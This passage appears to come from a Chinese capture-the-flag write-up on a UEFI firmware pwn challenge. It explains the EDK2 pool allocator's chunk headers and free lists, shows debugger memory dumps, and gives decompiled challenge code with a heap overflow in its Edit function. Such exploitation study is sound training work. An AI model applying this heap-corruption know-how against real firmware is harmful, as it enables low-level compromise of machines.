<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Each element is the sum of the 2 previous ones: this allows us to migrate</span></span><br><span class="line"><span class="comment">// blocks between bins by splitting them up, while not wasting too much memory</span></span><br><span class="line"><span class="comment">// as we would in a strict power-of-2 sequence</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line">STATIC CONST UINT16  mPoolSizeTable[] = &#123;</span><br><span class="line">  <span class="number">128</span>, <span class="number">256</span>, <span class="number">384</span>, <span class="number">640</span>, <span class="number">1024</span>, <span class="number">1664</span>, <span class="number">2688</span>, <span class="number">4352</span>, <span class="number">7040</span>, <span class="number">11392</span>, <span class="number">18432</span>, <span class="number">29824</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>总的来说堆管理器的结构如下：  </p>
<img src="/2025/01/06/uefi2/4.png" class="" title="我的图图呢">  

<p>申请出来的堆块会给加上堆块头 POOL_HEAD 和堆块尾 POOL_TAIL，而堆块被释放后堆块尾会给弃用，堆块头会给修改为 POOL_FREE</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  UINT32        Signature;</span><br><span class="line">  UINT32        Index;</span><br><span class="line">  LIST_ENTRY    Link;</span><br><span class="line">&#125; POOL_FREE;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  UINT32             Signature;</span><br><span class="line">  UINT32             Reserved;</span><br><span class="line">  EFI_MEMORY_TYPE    Type;</span><br><span class="line">  UINTN              Size;</span><br><span class="line">  CHAR8              Data[<span class="number">1</span>];</span><br><span class="line">&#125; POOL_HEAD;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  UINT32    Signature;</span><br><span class="line">  UINT32    Reserved;</span><br><span class="line">  UINTN     Size;</span><br><span class="line">&#125; POOL_TAIL;</span><br></pre></td></tr></table></figure>

<p>每当我们用 gBS-&gt;AllocatePool(type, BufferSize, Buffer) 申请一个堆块时，会首先将 BufferSize 进行八字节对齐，然后加上堆块头和堆块尾的大小。然后根据 type 找到对应的 POOL，然后再根据更新后的 size 找到对应的 FreeList。如果该 FreeList 不为空就直接从上面获取堆块并设置 POOL_HEAD 和 POOL_TAIL。如果 FreeList 为空，则从堆空间开辟新的堆块。<br>调用 gBS-&gt;FreePool 的操作则与之相反，同样是先同过 type 和 size 找到对应的 POOL 的 FreeList，然后将 POOL_HEAD 修改为 POOL_FREE 并将其链入 FreeList 中，这中间还有很多的细节，虽然在这道题目中用不上，不过如果仔细研究的话也许我们就能够在十分苛刻的条件下构造很极致的堆风水来实现漏洞的利用（等我考完研后看看能不能出在 WMCTF 上😚😚😚）  </p>
<p>我利用的题目的程序申请了 name 和 desc，name 为 0x10 个 a，desc 为 0x20 个 b，内存布局如下：  </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/30gx 0x2b552f00</span><br><span class="line">0x2b552f00:     0x0000000130646870      0x0000000000000000  &lt;---- name (using)</span><br><span class="line">0x2b552f10:     0x0000000000000040      0x6161616161616161  </span><br><span class="line">0x2b552f20:     0x6161616161616161      0xafafafafafafaf00</span><br><span class="line">0x2b552f30:     0xafafafaf6c617470      0x0000000000000040</span><br><span class="line">0x2b552f40:     0xafafafafafafafaf      0xafafafafafafafaf</span><br><span class="line">0x2b552f50:     0xafafafafafafafaf      0xafafafafafafafaf</span><br><span class="line">0x2b552f60:     0xafafafafafafafaf      0xafafafafafafafaf</span><br><span class="line">0x2b552f70:     0xafafafafafafafaf      0xafafafafafafafaf</span><br><span class="line">0x2b552f80:     0x0000000030646870      0x0000000000000000  &lt;---- desc (using)</span><br><span class="line">0x2b552f90:     0x0000000000000060      0x6262626262626262</span><br><span class="line">0x2b552fa0:     0x6262626262626262      0x6262626262626262</span><br><span class="line">0x2b552fb0:     0x6262626262626262      0xafafafafafafaf00</span><br><span class="line">0x2b552fc0:     0xafafafafafafafaf      0xafafafafafafafaf</span><br><span class="line">0x2b552fd0:     0xafafafaf6c617470      0x0000000000000060</span><br></pre></td></tr></table></figure>

<p>再将这个两个堆块释放后的内存空间如下：  </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/30gx 0x2b552f00</span><br><span class="line">0x2b552f00:     0x0000000030726670      0x000000002b8c9e18  &lt;---- name (freed)</span><br><span class="line">0x2b552f10:     0x000000002b552f88      0xafafafafafafafaf</span><br><span class="line">0x2b552f20:     0xafafafafafafafaf      0xafafafafafafafaf</span><br><span class="line">0x2b552f30:     0xafafafafafafafaf      0xafafafafafafafaf</span><br><span class="line">0x2b552f40:     0xafafafafafafafaf      0xafafafafafafafaf</span><br><span class="line">0x2b552f50:     0xafafafafafafafaf      0xafafafafafafafaf</span><br><span class="line">0x2b552f60:     0xafafafafafafafaf      0xafafafafafafafaf</span><br><span class="line">0x2b552f70:     0xafafafafafafafaf      0xafafafafafafafaf</span><br><span class="line">0x2b552f80:     0x0000000030726670      0x000000002b552f08  &lt;---- desc (freed)</span><br><span class="line">0x2b552f90:     0x000000002b8c9e18      0xafafafafafafafaf</span><br><span class="line">0x2b552fa0:     0xafafafafafafafaf      0xafafafafafafafaf</span><br><span class="line">0x2b552fb0:     0xafafafafafafafaf      0xafafafafafafafaf</span><br><span class="line">0x2b552fc0:     0xafafafafafafafaf      0xafafafafafafafaf</span><br><span class="line">0x2b552fd0:     0xafafafafafafafaf      0xafafafafafafafaf</span><br></pre></td></tr></table></figure>

<p>可以发现其内存空间与我们上面所分析的一致，此时该 FreeList 的结构大致如下：  </p>
<img src="/2025/01/06/uefi2/6.png" class="" title="我的图图呢">  

<h3 id="恢复了部分符号的IDA伪代码-1"><a href="#恢复了部分符号的IDA伪代码-1" class="headerlink" title="恢复了部分符号的IDA伪代码"></a>恢复了部分符号的IDA伪代码</h3><p>这里依然给出恢复了 UiApp 组件部分符号的 IDA 伪代码，仅供参考 :)  </p>
<h4 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">pwn</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> choice; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 StrLength; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// r8</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 *v3; <span class="comment">// r9</span></span><br><span class="line">  __int64 v4; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v5; <span class="comment">// rcx</span></span><br><span class="line">  __int64 v6; <span class="comment">// r8</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// r9</span></span><br><span class="line">  __int64 v8; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">char</span> v10[<span class="number">116</span>]; <span class="comment">// [rsp+28h] [rbp-138h] BYREF</span></span><br><span class="line">  <span class="type">char</span> AdministratorName[<span class="number">131</span>]; <span class="comment">// [rsp+9Ch] [rbp-C4h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v12[<span class="number">65</span>]; <span class="comment">// [rsp+11Fh] [rbp-41h] BYREF</span></span><br><span class="line"></span><br><span class="line">  ((<span class="type">void</span> (__fastcall *)(EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL *, __int64))SystemTable-&gt;ConOut-&gt;SetAttribute)(</span><br><span class="line">    SystemTable-&gt;ConOut,</span><br><span class="line">    <span class="number">9</span>i64);</span><br><span class="line">  ((<span class="type">void</span> (__fastcall *)(EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL *))SystemTable-&gt;ConOut-&gt;ClearScreen)(SystemTable-&gt;ConOut);</span><br><span class="line">  Output((<span class="type">unsigned</span> __int8 *)<span class="string">L&quot;** Loading D^3 BIOS GUARD ... **\n\n&quot;</span>);</span><br><span class="line">  OutputTitle();</span><br><span class="line">  ((<span class="type">void</span> (__fastcall *)(EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL *, __int64))SystemTable-&gt;ConOut-&gt;SetAttribute)(</span><br><span class="line">    SystemTable-&gt;ConOut,</span><br><span class="line">    <span class="number">15</span>i64);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      Output((<span class="type">unsigned</span> __int8 *)<span class="string">L&quot;\nPlease select your role.\n(1. Administrator 2. Visitor): &quot;</span>);</span><br><span class="line">      choice = inputNum();</span><br><span class="line">      <span class="keyword">if</span> ( choice != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      Output(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">      Input(AdministratorName, (<span class="type">int</span>)&amp;byte_40[<span class="number">1</span>]);</span><br><span class="line">      <span class="keyword">if</span> ( checkUser(<span class="string">&quot;A&quot;</span>, AdministratorName) )</span><br><span class="line">      &#123;</span><br><span class="line">        Output(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        ((<span class="type">void</span> (__fastcall *)(EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL *, __int64))SystemTable-&gt;ConOut-&gt;SetAttribute)(</span><br><span class="line">          SystemTable-&gt;ConOut,</span><br><span class="line">          <span class="number">4</span>i64);</span><br><span class="line">        Output((<span class="type">unsigned</span> __int8 *)AdministratorName);</span><br><span class="line">        ((<span class="type">void</span> (__fastcall *)(EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL *, __int64))SystemTable-&gt;ConOut-&gt;SetAttribute)(</span><br><span class="line">          SystemTable-&gt;ConOut,</span><br><span class="line">          <span class="number">15</span>i64);</span><br><span class="line">        Output(<span class="string">&quot;]&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        Output((<span class="type">unsigned</span> __int8 *)<span class="string">L&quot;Pass key: &quot;</span>);</span><br><span class="line">        InputKey(v12, <span class="number">0x41</span>u, <span class="number">0x2A</span>u);</span><br><span class="line">        sub_16C58(v10);</span><br><span class="line">        StrLength = GetStrLength(v12);</span><br><span class="line">        sub_16B21((__int64)v12, StrLength, v2, v3);</span><br><span class="line">        sub_16A1A(v5, v4, v6, v7);</span><br><span class="line">        <span class="keyword">if</span> ( !checkKey(v8, <span class="number">32</span>i64) )</span><br><span class="line">        &#123;</span><br><span class="line">          ((<span class="type">void</span> (__fastcall *)(EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL *, __int64))SystemTable-&gt;ConOut-&gt;SetAttribute)(</span><br><span class="line">            SystemTable-&gt;ConOut,</span><br><span class="line">            <span class="number">2</span>i64);</span><br><span class="line">          Output(<span class="string">&quot;S&quot;</span>);</span><br><span class="line">          ((<span class="type">void</span> (__fastcall *)(EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL *, __int64))SystemTable-&gt;ConOut-&gt;SetAttribute)(</span><br><span class="line">            SystemTable-&gt;ConOut,</span><br><span class="line">            <span class="number">15</span>i64);</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">        &#125;</span><br><span class="line">        ((<span class="type">void</span> (__fastcall *)(EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL *, __int64))SystemTable-&gt;ConOut-&gt;SetAttribute)(</span><br><span class="line">          SystemTable-&gt;ConOut,</span><br><span class="line">          <span class="number">4</span>i64);</span><br><span class="line">        Output((<span class="type">unsigned</span> __int8 *)<span class="string">L&quot;Sorry, You don&#x27;t have permission!\n&quot;</span>);</span><br><span class="line">        ((<span class="type">void</span> (__fastcall *)(EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL *, __int64))SystemTable-&gt;ConOut-&gt;SetAttribute)(</span><br><span class="line">          SystemTable-&gt;ConOut,</span><br><span class="line">          <span class="number">15</span>i64);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( choice != <span class="number">2</span> );</span><br><span class="line">  <span class="keyword">return</span> Visitor();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="Visitor"><a href="#Visitor" class="headerlink" title="Visitor"></a>Visitor</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">Visitor</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          VisitorMenu();</span><br><span class="line">          v0 = inputNum();</span><br><span class="line">          <span class="keyword">if</span> ( v0 != <span class="number">3</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          clearUser();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( v0 &gt; <span class="number">3</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v0 == <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          Add();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( v0 != <span class="number">2</span> )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">          Edit();</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v0 == <span class="number">4</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">LABEL_12:</span><br><span class="line">      Output(<span class="string">&quot;U&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    Output((<span class="type">unsigned</span> __int8 *)<span class="string">L&quot;Saving...\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( !SaveInfo() );</span><br><span class="line">  Output(<span class="string">&quot;P&quot;</span>);</span><br><span class="line">  WaitEndInfo();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>i64;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="Add-1"><a href="#Add-1" class="headerlink" title="Add"></a>Add</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">Add</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v0; <span class="comment">// r12d</span></span><br><span class="line"></span><br><span class="line">  LOBYTE(v0) = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !USER )</span><br><span class="line">  &#123;</span><br><span class="line">    ((<span class="type">void</span> (__fastcall *)(_QWORD, __int64, user **))gBS-&gt;AllocatePool)(<span class="number">0</span>i64, <span class="number">0x18</span>i64, &amp;USER);</span><br><span class="line">    <span class="keyword">if</span> ( !USER )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    init_info(USER, &amp;word_18);</span><br><span class="line">    Output(<span class="string">&quot;I&quot;</span>);</span><br><span class="line">    USER-&gt;ID = (<span class="type">int</span>)inputNum();</span><br><span class="line">    ((<span class="type">void</span> (__fastcall *)(_QWORD, __int64, <span class="type">char</span> **))gBS-&gt;AllocatePool)(<span class="number">0</span>i64, <span class="number">0x18</span>i64, &amp;USER-&gt;Name);</span><br><span class="line">    <span class="keyword">if</span> ( !USER-&gt;Name )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    Output(<span class="string">&quot;N&quot;</span>);</span><br><span class="line">    Input(DataTempBuffer, (<span class="type">int</span>)&amp;dword_100);</span><br><span class="line">    Unicode2Ascii(DataTempBuffer, USER-&gt;Name, <span class="number">0x18</span>i64);</span><br><span class="line">    ((<span class="type">void</span> (__fastcall *)(_QWORD, __int64, <span class="type">char</span> **))gBS-&gt;AllocatePool)(<span class="number">0</span>i64, <span class="number">0x38</span>i64, &amp;USER-&gt;Desc);</span><br><span class="line">    <span class="keyword">if</span> ( USER-&gt;Desc )</span><br><span class="line">    &#123;</span><br><span class="line">      Output((<span class="type">unsigned</span> __int8 *)<span class="string">L&quot;Desc: &quot;</span>);</span><br><span class="line">      Input(DataTempBuffer, (<span class="type">int</span>)&amp;dword_100);</span><br><span class="line">      Unicode2Ascii(DataTempBuffer, USER-&gt;Desc, <span class="number">0x38</span>i64);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="Edit"><a href="#Edit" class="headerlink" title="Edit"></a>Edit</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> <span class="title function_">Edit</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  __int64 DataSize; <span class="comment">// r8</span></span><br><span class="line">  <span class="type">char</span> *Desc; <span class="comment">// rdx</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !USER )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !USER-&gt;Name )</span><br><span class="line">  &#123;</span><br><span class="line">    ((<span class="type">void</span> (__fastcall *)(_QWORD, __int64, <span class="type">char</span> **))gBS-&gt;AllocatePool)(<span class="number">0</span>i64, <span class="number">0x18</span>i64, &amp;USER-&gt;Name);</span><br><span class="line">    <span class="keyword">if</span> ( !USER-&gt;Name )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !USER-&gt;Desc )</span><br><span class="line">  &#123;</span><br><span class="line">    ((<span class="type">void</span> (__fastcall *)(_QWORD, __int64, <span class="type">char</span> **))gBS-&gt;AllocatePool)(<span class="number">0</span>i64, <span class="number">0x38</span>i64, &amp;USER-&gt;Desc);</span><br><span class="line">    <span class="keyword">if</span> ( !USER-&gt;Desc )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  Output((<span class="type">unsigned</span> __int8 *)&amp;word_19476);</span><br><span class="line">  Output((<span class="type">unsigned</span> __int8 *)<span class="string">L&quot;2. Edit Desc.\n&quot;</span>);</span><br><span class="line">  Output((<span class="type">unsigned</span> __int8 *)<span class="string">L&quot;&gt;&gt; &quot;</span>);</span><br><span class="line">  v1 = inputNum();</span><br><span class="line">  <span class="keyword">if</span> ( v1 != <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v1 == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      Output((<span class="type">unsigned</span> __int8 *)<span class="string">L&quot;Desc: &quot;</span>);</span><br><span class="line">      Input(DataTempBuffer, (<span class="type">int</span>)&amp;dword_100);</span><br><span class="line">      DataSize = <span class="number">0x80</span>i64;</span><br><span class="line">      Desc = USER-&gt;Desc;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  Output(<span class="string">&quot;N&quot;</span>);</span><br><span class="line">  Input(DataTempBuffer, (<span class="type">int</span>)&amp;dword_100);</span><br><span class="line">  DataSize = <span class="number">0x18</span>i64;</span><br><span class="line">  Desc = USER-&gt;Name;</span><br><span class="line">LABEL_12:</span><br><span class="line">  Unicode2Ascii(DataTempBuffer, Desc, DataSize);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="clearUser"><a href="#clearUser" class="headerlink" title="clearUser"></a>clearUser</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> <span class="title function_">clearUser</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> result; <span class="comment">// al</span></span><br><span class="line">  user *v1; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  result = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( USER &amp;&amp; USER-&gt;Name )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( USER-&gt;Desc )</span><br><span class="line">    &#123;</span><br><span class="line">      gBS-&gt;FreePool();</span><br><span class="line">      v1 = USER;</span><br><span class="line">      USER-&gt;Name = <span class="number">0</span>i64;</span><br><span class="line">      ((<span class="type">void</span> (__fastcall *)(<span class="type">char</span> *))gBS-&gt;FreePool)(v1-&gt;Desc);</span><br><span class="line">      USER-&gt;Desc = <span class="number">0</span>i64;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="SaveInfo"><a href="#SaveInfo" class="headerlink" title="SaveInfo"></a>SaveInfo</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> <span class="title function_">SaveInfo</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *Name; <span class="comment">// rsi</span></span><br><span class="line">  <span class="type">size_t</span> StrLength; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">char</span> *Desc; <span class="comment">// rsi</span></span><br><span class="line">  <span class="type">size_t</span> v3; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">char</span> result; <span class="comment">// al</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !USER )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  ((<span 